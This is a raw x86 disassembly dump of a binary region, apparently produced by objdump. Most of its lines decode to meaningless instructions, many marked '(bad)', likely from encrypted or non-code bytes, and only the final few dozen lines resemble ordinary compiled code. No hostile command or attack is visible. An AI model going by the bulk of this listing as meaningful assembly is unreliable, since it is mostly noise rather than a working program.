  40308c:	cdq    
  40308d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40308e:	mov    bl,0x4d
  403090:	cmp    eax,DWORD PTR [eax-0x645bd60c]
  403096:	cmp    eax,0xfdc4d1f0
  40309b:	or     ch,BYTE PTR [ebp+eiz*4-0x33eff33a]
  4030a2:	lods   al,BYTE PTR ds:[esi]
  4030a3:	out    dx,al
  4030a4:	(bad)  
  4030a5:	test   eax,0x3b97859d
  4030aa:	repz cli 
  4030ac:	sar    DWORD PTR [ecx+0x62],0x14
  4030b0:	out    0x2f,eax
  4030b2:	cs adc eax,0xbeab98bc
  4030b8:	rcr    BYTE PTR [ebx+0x323dbd2c],cl
  4030be:	lods   al,BYTE PTR ds:[esi]
  4030bf:	aad    0xf
  4030c1:	ror    esp,1
  4030c3:	mov    ebp,0xf9928238
  4030c8:	(bad)  
  4030c9:	loopne 0x40309b
  4030cb:	lods   eax,DWORD PTR ds:[esi]
  4030cc:	sub    bl,ch
  4030ce:	test   eax,0xd1e9aefb
  4030d3:	jmp    0x3944:0x88bd47d7
  4030da:	or     al,0x3a
  4030dc:	lds    edx,FWORD PTR [edx-0x2]
  4030df:	sbb    BYTE PTR [esi],bh
  4030e1:	mov    ecx,0x30b8c77f
  4030e6:	inc    eax
  4030e7:	shl    BYTE PTR [ebp+ecx*4-0x63],cl
  4030eb:	xor    bh,BYTE PTR [esi-0x2e]
  4030ee:	xchg   esi,eax
  4030ef:	(bad)  [ebp+0x75]
  4030f2:	and    eax,0x4a2ae848
  4030f7:	and    BYTE PTR [esi-0x3a],0x33
  4030fb:	dec    edi
  4030fc:	jbe    0x4030d6
  4030fe:	cmc    
  4030ff:	xchg   DWORD PTR [eax],edi
  403101:	clc    
  403102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403103:	cmp    DWORD PTR [ebx],esi
  403105:	ret    
  403106:	fidiv  DWORD PTR [edx+0x74fef484]
  40310c:	push   eax
  40310d:	cmp    esp,DWORD PTR [esi+0x139ff282]
  403113:	and    dh,BYTE PTR [esi+eiz*2+0x45]
  403117:	jne    0x4030a3
  403119:	adc    al,0x3
  40311b:	leave  
  40311c:	jg     0x403146
  40311e:	cld    
  40311f:	arpl   WORD PTR [edx+ebx*4-0x60],bp
  403123:	add    dh,BYTE PTR es:[eax+edi*8]
  403127:	xor    dl,BYTE PTR [ecx]
  403129:	jle    0x403112
  40312b:	int3   
  40312c:	push   eax
  40312d:	popf   
  40312e:	std    
  40312f:	icebp  
  403130:	(bad)  
  403131:	sbb    eax,0x92b155d
  403136:	pop    es
  403137:	dec    ecx
  403138:	mov    ecx,0x7168c8df
  40313d:	sub    dh,al
  40313f:	pop    ds
  403140:	inc    edi
  403141:	adc    bl,BYTE PTR [ebp-0x3a9823ea]
  403147:	fucom  st(4)
  403149:	mov    esi,0x8e45d16f
  40314e:	sbb    al,0x7f
  403150:	aad    0xe4
  403152:	enter  0x917d,0xc8
  403156:	ss inc esi
  403158:	je     0x4030f4
  40315a:	jg     0x4031d9
  40315c:	mov    WORD PTR [esi],?
  40315e:	xor    ch,al
  403160:	inc    ebx
  403161:	xchg   edi,eax
  403162:	sbb    BYTE PTR [ecx],al
  403164:	pop    ecx
  403165:	dec    ecx
  403166:	push   es
  403167:	mov    WORD PTR [ebp+0x1fb79303],gs
  40316d:	icebp  
  40316e:	mov    ds:0xc7e185e1,eax
  403173:	mov    cl,0xe4
  403175:	mov    esp,0x3f6cd19c
  40317a:	push   ss
  40317b:	jle    0x40312a
  40317d:	add    DWORD PTR ds:0x98ccfd8d,ebx
  403183:	shr    BYTE PTR [ecx+0x16bae99c],1
  403189:	lock mov bh,0x7
  40318c:	fs cmp ebp,ebp
  40318f:	jmp    0x403200
  403191:	enter  0xa26f,0xcd
  403195:	pop    ebp
  403196:	add    ch,BYTE PTR [eax-0x414e2e31]
  40319c:	mov    cl,0x9c
  40319e:	dec    ebp
  40319f:	(bad)  
  4031a0:	out    dx,al
  4031a1:	icebp  
  4031a2:	test   DWORD PTR [eax+0x7],esi
  4031a5:	ss push ss
  4031a7:	outs   dx,BYTE PTR ds:[esi]
  4031a9:	sbb    eax,0x69d4deba
  4031ae:	sub    DWORD PTR [ecx+esi*2-0x5c],ecx
  4031b2:	jmp    0xa72:0x3b85aee7
  4031b9:	cld    
  4031ba:	addr16 out dx,al
  4031bc:	lahf   
  4031bd:	fsub   st,st(7)
  4031bf:	add    BYTE PTR ds:0x6eb3e633,dl
  4031c5:	loop   0x40318b
  4031c7:	pushf  
  4031c8:	jb     0x4031fb
  4031ca:	push   esp
  4031cb:	fmul   DWORD PTR [eax+edx*2+0x4c]
  4031cf:	pusha  
  4031d0:	and    dh,BYTE PTR [ecx-0x718ed2c9]
  4031d6:	scas   al,BYTE PTR es:[edi]
  4031d7:	xlat   BYTE PTR ds:[ebx]
  4031d8:	xchg   ebp,eax
  4031d9:	cmp    ebp,DWORD PTR [ebx]
  4031db:	xor    al,0x23
  4031dd:	inc    ecx
  4031de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031df:	mov    al,0x8b
  4031e1:	fcom   st(6)
  4031e3:	aam    0x1e
  4031e5:	jns    0x4031a5
  4031e7:	gs js  0x403186
  4031ea:	inc    esp
  4031eb:	loop   0x4031b7
  4031ed:	or     BYTE PTR [ecx+0x6d],cl
  4031f0:	neg    al
  4031f2:	adc    al,0x81
  4031f4:	(bad)  
  4031f5:	cs ds jb 0x40324e
  4031f9:	icebp  
  4031fa:	sub    DWORD PTR [eax],ebp
  4031fc:	xor    ebx,DWORD PTR [ebp+0x44]
  4031ff:	cmp    BYTE PTR [eax],ah
  403201:	add    al,0x92
  403203:	cmp    al,BYTE PTR [ebp-0x9]
  403206:	ror    BYTE PTR [edx-0x60],cl
  403209:	pop    ecx
  40320a:	xor    al,0xb
  40320c:	xchg   edi,eax
  40320d:	mov    ds:0x9c6d4e01,eax
  403212:	aaa    
  403213:	dec    ebx
  403214:	xor    ah,ah
  403216:	mov    esi,0x1f078571
  40321b:	mov    esi,0x8b2aeead
  403220:	dec    eax
  403221:	cmp    dh,BYTE PTR [ecx-0x1810dce9]
  403227:	icebp  
  403228:	pop    ebx
  403229:	xchg   ebp,eax
  40322a:	sub    DWORD PTR [edi+0x5d95d675],edx
  403230:	jns    0x4031fb
  403232:	adc    ah,ch
  403234:	shl    BYTE PTR [ebx+ebx*8],1
  403237:	retf   
  403238:	mov    eax,ds:0x83e4cef6
  40323d:	arpl   ax,sp
  40323f:	and    al,0xb0
  403241:	loope  0x4031d7
  403243:	rcl    BYTE PTR [esi],1
  403245:	fsub   DWORD PTR [eax+0x58]
  403248:	pop    ebx
  403249:	es das 
  40324b:	push   ss
  40324c:	hlt    
  40324d:	xchg   ecx,eax
  40324e:	xchg   DWORD PTR [edx+0x6],edx
  403251:	jp     0x40327f
  403253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403254:	mov    BYTE PTR [ecx+0x2b],bh
  403257:	cwde   
  403258:	xchg   ebp,eax
  403259:	fcomp  QWORD PTR [ebx]
  40325c:	pop    eax
  40325d:	test   eax,0xa8cba0f0
  403262:	xor    al,0xa1
  403264:	ret    
  403265:	inc    esi
  403266:	cwde   
  403267:	or     dl,BYTE PTR [edi+esi*2+0x30]
  40326b:	aad    0x68
  40326d:	mov    al,0x42
  40326f:	loope  0x403205
  403271:	dec    ebp
  403272:	fdivr  QWORD PTR [esp+ebx*2-0x56]
  403276:	retf   
  403277:	arpl   WORD PTR [esi-0x2bb99555],dx
  40327d:	out    dx,eax
  40327e:	in     eax,0x54
  403280:	jl     0x40322c
  403282:	push   esi
  403283:	ins    DWORD PTR es:[edi],dx
  403284:	xchg   ebp,eax
  403285:	(bad)  
  403286:	test   DWORD PTR [edi],0xf85852e7
  40328c:	(bad)  
  40328d:	imul   edi,DWORD PTR [edi-0x4b],0xffffffcd
  403291:	lock dec ecx
  403293:	sub    eax,0x3e2eb8ed
  403298:	pop    ecx
  403299:	add    BYTE PTR [eax-0x27],0xe7
  40329d:	loop   0x403284
  40329f:	jmp    0xc5b:0x39df14cd
  4032a6:	sbb    edx,DWORD PTR cs:[edx+0x6d]
  4032aa:	sbb    al,BYTE PTR [esi+0x36b7679a]
  4032b0:	jmp    0x38c8:0x8a0bbc02
  4032b7:	adc    eax,0xd87d1ace
  4032bc:	out    0x99,eax
  4032be:	enter  0xf775,0x80
  4032c2:	bound  ebp,QWORD PTR [edi+0x17]
  4032c5:	fld    TBYTE PTR [edi+ebx*4-0x2c1868ab]
  4032cc:	data16 (bad) 
  4032ce:	xlat   BYTE PTR ds:[ebx]
  4032cf:	fwait
  4032d0:	or     eax,0x9ba6d2d0
  4032d5:	aaa    
  4032d6:	jecxz  0x403323
  4032d8:	xchg   ebp,eax
  4032d9:	fs in  eax,dx
  4032db:	shr    al,1
  4032dd:	cmc    
  4032de:	inc    edi
  4032df:	mov    ebx,0xb388e20
  4032e4:	test   BYTE PTR [ecx-0xf],dh
  4032e7:	dec    ebx
  4032e8:	mov    ah,0x21
  4032ea:	mov    edi,0x5dc97c8f
  4032ef:	imul   eax,DWORD PTR [ebx],0xffffffc9
  4032f2:	xor    ah,BYTE PTR [edx+0x244d4808]
  4032f8:	jmp    0x9b82:0x6e8dfede
  4032ff:	and    BYTE PTR [esi],dh
  403301:	mov    ch,0x93
  403303:	fdiv   st(4),st
  403305:	push   edi
  403306:	xor    eax,0xe6257636
  40330b:	scas   eax,DWORD PTR es:[edi]
  40330c:	and    DWORD PTR [esi+0x3d23d7ac],esp
  403312:	fsub   DWORD PTR ss:[eax]
  403315:	xchg   edi,eax
  403316:	mov    ecx,0x21a33a0e
  40331b:	mov    ds:0xf0fae367,al
  403320:	popf   
  403321:	or     al,0x7c
  403323:	aad    0xda
  403325:	push   ds
  403326:	outs   dx,DWORD PTR ds:[esi]
  403327:	loop   0x403363
  403329:	shl    BYTE PTR [ebp+0x6e],1
  40332c:	das    
  40332d:	pop    eax
  40332e:	mov    ah,BYTE PTR [edx-0x39c37268]
  403334:	out    dx,eax
  403335:	and    BYTE PTR [ebp+0x1f],ah
  403338:	sbb    edx,DWORD PTR [esi-0x6b3b35e3]
  40333e:	mov    dl,0x92
  403340:	into   
  403341:	push   edi
  403342:	xchg   ebp,eax
  403343:	clc    
  403344:	mov    edx,0xa38bda54
  403349:	push   0x57
  40334b:	int    0x60
  40334d:	dec    edi
  40334e:	shl    al,0x91
  403351:	mul    BYTE PTR [ebx+0x613391cc]
  403357:	out    0x4a,eax
  403359:	fwait
  40335a:	pop    ebx
  40335b:	popa   
  40335c:	dec    esi
  40335d:	cdq    
  40335e:	(bad)  
  40335f:	cmc    
  403360:	push   edi
  403361:	mov    ss,WORD PTR [edx+0x66]
  403364:	jbe    0x403344
  403366:	js     0x403303
  403368:	lock syscall 
  40336b:	stos   DWORD PTR es:[edi],eax
  40336c:	aad    0xdc
  40336e:	fistp  DWORD PTR [edi]
  403370:	test   BYTE PTR [ebx],ah
  403372:	dec    ecx
  403373:	out    dx,al
  403374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403375:	dec    esi
  403376:	(bad)  
  403377:	jecxz  0x40336b
  403379:	xor    dh,BYTE PTR [edx-0x1232ff92]
  40337f:	fwait
  403380:	mov    ds:0xfa703a2d,eax
  403385:	stos   DWORD PTR es:[edi],eax
  403386:	ins    DWORD PTR es:[edi],dx
  403387:	cmp    ebp,DWORD PTR [edx]
  403389:	or     eax,0xa242b592
  40338e:	lds    edx,FWORD PTR [esi+0x2c8bee07]
  403394:	stos   BYTE PTR es:[edi],al
  403395:	xor    eax,ecx
  403397:	cmp    DWORD PTR [edi+0x2a17e1dd],eax
  40339d:	fldcw  WORD PTR ds:0x87b1784d
  4033a3:	imul   edi,DWORD PTR [edx],0x3c8db787
  4033a9:	cli    
  4033aa:	sub    ebx,eax
  4033ac:	mov    eax,DWORD PTR [ebx]
  4033ae:	mov    ch,0x1a
  4033b0:	test   dl,bl
  4033b2:	xor    eax,0xa6d13c0d
  4033b7:	mov    dh,0xf1
  4033b9:	call   0x4cb018fa
  4033be:	adc    eax,0x1d9f992
  4033c3:	or     ch,BYTE PTR [esi+0x46b9d555]
  4033c9:	outs   dx,BYTE PTR ds:[esi]
  4033ca:	arpl   WORD PTR [ebp-0x45],di
  4033cd:	ja     0x40342f
  4033cf:	neg    BYTE PTR [ebx]
  4033d1:	cmc    
  4033d2:	fisubr WORD PTR [ebp-0x6b]
  4033d5:	xchg   ecx,eax
  4033d6:	lock xchg esi,eax
  4033d8:	ins    BYTE PTR es:[edi],dx
  4033d9:	dec    esi
  4033da:	fisub  WORD PTR [esi+0x22]
  4033dd:	pop    ds
  4033de:	or     ah,BYTE PTR [ebp-0x7ff30cd1]
  4033e4:	sub    esp,DWORD PTR [esp+esi*2+0x6e]
  4033e8:	mov    eax,0x5aaa6b6f
  4033ed:	sbb    dh,BYTE PTR [esi+0x11]
  4033f0:	and    eax,0xe662ee9b
  4033f5:	jno    0x4033f3
  4033f7:	mov    eax,ds:0xcf7ca899
  4033fc:	mov    cl,BYTE PTR [edi-0x38e26ff9]
  403402:	call   0x8a6ab786
  403407:	mov    ah,0x59
  403409:	in     eax,dx
  40340a:	imul   DWORD PTR [ebx]
  40340c:	arpl   WORD PTR [ebp-0x7],dx
  40340f:	mov    cl,0x25
  403411:	test   bl,0x9b
  403414:	sub    ebx,DWORD PTR [ebx-0x5d8aac60]
  40341a:	push   ecx
  40341b:	mov    al,BYTE PTR cs:[edx+0x5e]
  40341f:	fdiv   DWORD PTR ds:0xaf0d3ab
  403425:	fdivr  st(1),st
  403427:	scas   al,BYTE PTR es:[edi]
  403428:	xor    al,0xc9
  40342a:	dec    esi
  40342b:	sub    al,BYTE PTR [edi]
  40342d:	xchg   ebx,eax
  40342e:	dec    eax
  40342f:	dec    edi
  403430:	fstp   DWORD PTR [edx]
  403432:	sub    bl,BYTE PTR ds:0x37cfd341
  403438:	dec    edi
  403439:	and    edi,DWORD PTR [ecx-0x2f]
  40343c:	int3   
  40343d:	mov    eax,0x50513f6b
  403442:	jns    0x40340e
  403444:	add    eax,DWORD PTR [eax+esi*8]
  403447:	cld    
  403448:	jp     0x4034b3
  40344a:	mov    eax,0x40c7b71a
  40344f:	dec    esp
  403450:	sub    eax,0xa8c173c2
  403455:	jge    0x40342d
  403457:	shl    BYTE PTR [edi],cl
  403459:	xchg   ebp,eax
  40345a:	sbb    al,BYTE PTR [ecx-0x31]
  40345d:	jle    0x4034b3
  40345f:	jmp    0x40340a
  403461:	push   ds
  403462:	push   eax
  403463:	xchg   ebp,eax
  403464:	add    BYTE PTR [edi],cl
  403466:	aaa    
  403467:	jg     0x40343c
  403469:	ret    
  40346a:	xchg   ecx,eax
  40346b:	cmp    ebx,DWORD PTR [ecx-0x38f102f8]
  403471:	shl    BYTE PTR [edx+0x16a12455],cl
  403477:	sti    
  403478:	xor    eax,0x182ef1d5
  40347d:	sti    
  40347e:	and    DWORD PTR [ecx-0x3e],edx
  403481:	lock push esp
  403483:	mov    al,0x4d
  403485:	push   cs
  403486:	nop
  403487:	popa   
  403488:	call   0x141e8488
  40348d:	push   eax
  40348e:	leave  
  40348f:	jmp    DWORD PTR [ebx+ecx*8+0x70549706]
  403496:	lds    ecx,FWORD PTR [ebp+eax*1-0x6a]
  40349a:	out    0x5,eax
  40349c:	mov    ebx,0xd05dac89
  4034a1:	shr    BYTE PTR [eax+0x33],cl
  4034a4:	push   es
  4034a5:	stc    
  4034a6:	and    BYTE PTR [ecx+0x7],cl
  4034a9:	add    al,0xaf
  4034ab:	mul    BYTE PTR [edi]
  4034ad:	pop    es
  4034ae:	aad    0x8b
  4034b0:	retf   0xf11
  4034b3:	jecxz  0x403476
  4034b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034b6:	(bad)  
  4034b8:	jb     0x40351f
  4034ba:	enter  0x626,0x23
  4034be:	(bad)  
  4034bf:	enter  0x9286,0xa3
  4034c3:	and    esp,DWORD PTR [esi-0x716dd1a4]
  4034c9:	xchg   ebx,eax
  4034ca:	(bad)  
  4034cb:	xchg   edx,eax
  4034cc:	in     eax,0x70
  4034ce:	or     DWORD PTR [edi],edx
  4034d0:	call   0x41ec14ab
  4034d5:	push   ecx
  4034d6:	adc    al,0xf9
  4034d8:	scas   eax,DWORD PTR es:[edi]
  4034d9:	sbb    eax,0x75259000
  4034de:	mov    ebp,0xddf7e3b2
  4034e3:	dec    edx
  4034e4:	add    eax,0xac4f752
  4034e9:	test   eax,0x5917f3fb
  4034ee:	or     edx,DWORD PTR [edx+0x79]
  4034f1:	fbld   TBYTE PTR ds:0xb6aba0f3
  4034f7:	push   ds
  4034f8:	addr16 (bad) 
  4034fa:	shr    DWORD PTR [edi-0x4ef35d99],1
  403500:	fsubr  QWORD PTR [ecx]
  403502:	jne    0x403566
  403504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403505:	or     DWORD PTR [ebx-0x33],esp
  403508:	dec    esi
  403509:	push   edi
  40350a:	rcl    bl,1
  40350c:	in     al,dx
  40350d:	and    bl,bh
  40350f:	dec    ebp
  403510:	scas   al,BYTE PTR es:[edi]
  403511:	and    ch,cl
  403513:	leave  
  403514:	imul   esp,DWORD PTR [esi+0x46],0xffffffbf
  403518:	push   0x10
  40351a:	and    eax,0xf48ddbba
  40351f:	call   0x5043397b
  403524:	cmc    
  403525:	les    edi,FWORD PTR [esi+0x662ea9f6]
  40352b:	aaa    
  40352c:	ss pop ecx
  40352e:	sahf   
  40352f:	data16 daa 
  403531:	fstp   QWORD PTR [edx-0x38]
  403534:	je     0x403557
  403536:	js     0x4034d6
  403538:	scas   eax,DWORD PTR es:[edi]
  403539:	pop    edx
  40353a:	xor    eax,0xe85777eb
  40353f:	mov    ecx,0x9d1879a9
  403544:	fcomp  QWORD PTR [edx+0x7b88a941]
  40354a:	out    0x9d,al
  40354c:	jbe    0x40351a
  40354e:	mov    ecx,0x40193134
  403553:	push   ebp
  403554:	and    ebx,DWORD PTR [ecx-0x6567d2e4]
  40355a:	imul   ebx,DWORD PTR [ebx-0x56],0x246787e6
  403561:	xchg   ecx,eax
  403562:	lods   eax,DWORD PTR ds:[esi]
  403563:	sahf   
  403564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403565:	mov    ds:0x6b5c166,al
  40356a:	sbb    eax,0x6b0a2d75
  40356f:	mov    BYTE PTR [esi-0x2e],al
  403572:	dec    ebp
  403573:	inc    eax
  403574:	into   
  403575:	pop    ss
  403576:	jl     0x4035f7
  403578:	sbb    eax,0x5587350f
  40357d:	in     eax,dx
  40357e:	mov    dl,0x8d
  403581:	stos   DWORD PTR es:[edi],eax
  403582:	das    
  403583:	adc    DWORD PTR [edi],0xffffffc3
  403586:	(bad)  
  403587:	jo     0x403602
  403589:	(bad)  
  40358a:	movq   mm6,QWORD PTR [ebp-0x2]
  40358e:	cmc    
  40358f:	paddq  mm5,mm1
  403592:	jmp    0x450d:0x73be5d96
  403599:	jno    0x4035ca
  40359b:	pop    ecx
  40359c:	inc    esp
  40359d:	pop    ebp
  40359e:	scas   al,BYTE PTR es:[edi]
  40359f:	popa   
  4035a0:	ficomp DWORD PTR [eax+ebp*2]
  4035a3:	mov    ds:0xe2db5e2,eax
  4035a8:	leave  
  4035a9:	jge    0x40355a
  4035ab:	dec    edx
  4035ac:	sub    DWORD PTR [edi-0x101acde9],ecx
  4035b2:	mov    ds:0x5d6f2009,eax
  4035b7:	vmread DWORD PTR [ebx-0x73],ebp
  4035bb:	test   eax,0x9f64e534
  4035c0:	xor    dh,BYTE PTR [eax+0x6d435d89]
  4035c6:	(bad)
  4035c9:	cmp    BYTE PTR [edi-0x2903e6ba],dl
  4035cf:	pop    ebx
  4035d0:	stc    
  4035d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035d2:	push   cs
  4035d3:	xor    eax,0xab2424a9
  4035d8:	ja     0x403567
  4035da:	jmp    0x49e1:0xa493439a
  4035e1:	inc    esi
  4035e2:	stos   BYTE PTR es:[edi],al
  4035e3:	sbb    ebx,DWORD PTR [esi+0x32]
  4035e6:	mov    bl,0x66
  4035e8:	ret    0x32a4
  4035eb:	fsubr  QWORD PTR [esi]
  4035ed:	push   esi
  4035ee:	pop    ds
  4035ef:	xchg   esi,eax
  4035f0:	sub    eax,0x62b36631
  4035f5:	leave  
  4035f6:	jo     0x4035b7
  4035f8:	mov    eax,0x7c08e44c
  4035fd:	push   esp
  4035fe:	ror    DWORD PTR [edx+0x5a],1
  403601:	inc    ebx
  403602:	test   eax,0x4e88b5bd
  403607:	mov    eax,ds:0x5aadd763
  40360c:	mov    ds:0x42b6fe77,eax
  403611:	sbb    bl,BYTE PTR [eax-0x1e]
  403614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403615:	jbe    0x4035fc
  403617:	add    al,0xda
  403619:	xor    ecx,edx
  40361b:	test   eax,0xf6124250
  403620:	push   es
  403621:	std    
  403622:	bound  edx,QWORD PTR gs:[eax-0x5b]
  403626:	js     0x403644
  403628:	das    
  403629:	std    
  40362a:	xchg   ebx,eax
  40362b:	(bad)  
  40362d:	adc    eax,0xf09bf617
  403632:	cmp    esp,ebp
  403634:	ds mov dl,0x41
  403637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403638:	call   0x69478257
  40363d:	shl    BYTE PTR [edx+edx*4+0x50],0xfa
  403642:	retf   
  403643:	xlat   BYTE PTR ds:[ebx]
  403644:	pop    ds
  403645:	jp     0x4035f9
  403647:	push   0xfffffff5
  403649:	jnp    0x403694
  40364b:	inc    esi
  40364c:	sub    al,0xda
  40364e:	gs sub eax,0xfcaf0eb4
  403654:	outs   dx,DWORD PTR ds:[esi]
  403655:	mov    cl,bh
  403657:	push   edx
  403658:	sbb    eax,0x1767fa84
  40365d:	dec    edi
  40365e:	add    ah,BYTE PTR [edx]
  403660:	sbb    ch,BYTE PTR ds:0xa85d5b04
  403666:	stos   DWORD PTR es:[edi],eax
  403667:	pushf  
  403668:	sub    al,0xa6
  40366a:	mov    ecx,0xcf3fa703
  40366f:	push   es
  403670:	bound  esi,QWORD PTR [ebp+0x4efcfafb]
  403676:	or     BYTE PTR [eax-0x48],dh
  403679:	cld    
  40367a:	jp     0x403654
  40367c:	mov    al,ds:0xc9b04c2
  403681:	jo     0x403692
  403683:	ins    BYTE PTR es:[edi],dx
  403684:	or     al,cl
  403686:	cmp    ah,BYTE PTR [edi-0x5b]
  403689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40368a:	cmp    DWORD PTR [ebx],eax
  40368c:	push   ds
  40368d:	in     eax,0xa4
  40368f:	out    0xed,eax
  403691:	jecxz  0x40363a
  403693:	fdiv   st(5),st
  403695:	hlt    
  403696:	mov    ebp,0x7d3ab931
  40369b:	mul    ah
  40369d:	inc    esp
  40369e:	(bad)  
  40369f:	xchg   edi,eax
  4036a0:	(bad)  
  4036a1:	aam    0x6c
  4036a3:	imul   esp,ebp,0x5
  4036a6:	scas   al,BYTE PTR es:[edi]
  4036a7:	inc    edi
  4036a8:	and    DWORD PTR [edx-0x37d41562],ecx
  4036ae:	sub    ah,bh
  4036b0:	(bad)  
  4036b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036b2:	xchg   ebx,eax
  4036b3:	loop   0x4036fd
  4036b5:	mov    al,BYTE PTR [ecx-0x56d4c4e1]
  4036bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036bc:	icebp  
  4036bd:	inc    esi
  4036be:	outs   dx,BYTE PTR ds:[esi]
  4036bf:	push   0x41
  4036c1:	add    eax,0x36307dd6
  4036c6:	ror    DWORD PTR [ecx],0xd5
  4036c9:	fmul   DWORD PTR [edx-0x1bcbeabc]
  4036cf:	jnp    0x403731
  4036d1:	jns    0x403715
  4036d3:	ins    DWORD PTR es:[edi],dx
  4036d4:	stos   BYTE PTR es:[edi],al
  4036d5:	ins    BYTE PTR es:[edi],dx
  4036d6:	(bad)  
  4036d7:	arpl   WORD PTR [edx],dx
  4036d9:	inc    edi
  4036da:	sbb    ch,BYTE PTR [eax]
  4036dc:	sub    DWORD PTR [eax],ecx
  4036de:	mov    eax,ds:0x738768cd
  4036e3:	pop    eax
  4036e4:	aas    
  4036e5:	adc    edx,ebx
  4036e7:	ret    0x37a5
  4036ea:	dec    ecx
  4036eb:	jg     0x40366e
  4036ed:	outs   dx,DWORD PTR ds:[esi]
  4036ee:	out    0x9c,eax
  4036f0:	hlt    
  4036f1:	adc    eax,0x4f413477
  4036f6:	xchg   esp,eax
  4036f7:	sbb    bh,bl
  4036f9:	jmp    0x43d84e11
  4036fe:	inc    esi
  4036ff:	pop    ebp
  403700:	cs into 
  403702:	leave  
  403703:	cmp    DWORD PTR cs:[esi],edi
  403706:	sbb    al,dh
  403708:	sbb    DWORD PTR ds:0x409e798d,ebx
  40370e:	mov    gs,WORD PTR [esi+0x74e4085d]
  403714:	fnstcw WORD PTR [edx-0x17]
  403717:	sub    BYTE PTR [ebx-0x1c],bh
  40371a:	dec    ebp
  40371b:	and    esp,ebx
  40371d:	mov    ebp,0x38baeed0
  403722:	mov    esi,0x28dc75c9
  403727:	loopne 0x4036e3
  403729:	in     eax,0x73
  40372b:	sub    eax,0x1b1332d1
  403730:	cmp    bh,dl
  403732:	sbb    eax,0xc8c0f076
  403737:	sub    BYTE PTR [ecx+0x27],cl
  40373a:	call   0x8dcc:0xd7bce5a4
  403741:	ja     0x4036f6
  403743:	je     0x403758
  403745:	sub    eax,0x71337b1c
  40374a:	loope  0x40374a
  40374c:	inc    esp
  40374d:	mov    DWORD PTR [ebp+0x682751b8],edi
  403753:	jo     0x6eb4467e
  403759:	sub    dl,BYTE PTR [edi+0x3e]
  40375c:	pop    ebp
  40375d:	mov    cl,0x14
  40375f:	push   0x5d
  403761:	push   0x72
  403763:	push   ss
  403764:	add    DWORD PTR [eax],ebx
  403766:	adc    eax,0xbb516e64
  40376b:	jbe    0x4037df
  40376d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40376e:	icebp  
  40376f:	add    BYTE PTR [ecx],bh
  403771:	loope  0x4037ab
  403773:	push   ds
  403774:	add    ebp,DWORD PTR [edx+esi*4-0x4f]
  403778:	cmp    eax,0xdd2ec17d
  40377d:	ds and esp,esp
  403780:	(bad)  
  403781:	sbb    eax,0xa53b23b7
  403786:	test   DWORD PTR [ebx],ebp
  403788:	lock sub DWORD PTR [edi],edx
  40378b:	mov    dh,0x69
  40378d:	push   edi
  40378e:	pushf  
  40378f:	push   esi
  403790:	pusha  
  403791:	fwait
  403792:	pop    edi
  403793:	jno    0x4037cc
  403795:	jmp    0x99497c01
  40379a:	adc    BYTE PTR [edi-0x482df4be],0x4a
  4037a1:	iret   
  4037a2:	mov    ah,0xb1
  4037a4:	imul   BYTE PTR [eax+0x64e301aa]
  4037aa:	jmp    DWORD PTR [eax+eax*8+0x4d7e632b]
  4037b1:	sbb    edi,DWORD PTR [edx+0x10d1afd4]
  4037b7:	pop    edi
  4037b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037b9:	(bad)  
  4037ba:	int3   
  4037bb:	(bad)  
  4037bd:	xchg   ecx,eax
  4037be:	mov    fs,ebx
  4037c0:	into   
  4037c1:	gs lock js 0x403778
  4037c5:	loopne 0x403822
  4037c7:	repnz cmp al,BYTE PTR [edi+0x604b30c3]
  4037ce:	(bad)  
  4037cf:	xchg   edi,eax
  4037d0:	jno    0x4037f4
  4037d2:	add    ecx,DWORD PTR [esp+edi*2]
  4037d5:	rol    DWORD PTR [esi-0x2b],cl
  4037d8:	cmp    bl,BYTE PTR [eax+0x40bfd4f2]
  4037de:	bound  ecx,QWORD PTR [ecx-0xc36f98a]
  4037e4:	xlat   BYTE PTR ds:[ebx]
  4037e5:	xchg   edx,eax
  4037e6:	rcl    al,1
  4037e8:	(bad)  
  4037e9:	in     al,dx
  4037ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037eb:	(bad)  
  4037ec:	fst    QWORD PTR [eax+ebp*8+0x6f]
  4037f0:	jbe    0x4037f3
  4037f2:	add    BYTE PTR [ebp+0x2b840fc0],al
  4037f8:	add    BYTE PTR [eax],al
  4037fa:	add    BYTE PTR [ebp-0x8f7b],cl
  403800:	call   DWORD PTR [eax-0x75]
  403803:	inc    ebp
  403804:	shl    BYTE PTR [ebx],1
  403806:	mov    BYTE PTR [ebx],0xc7
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
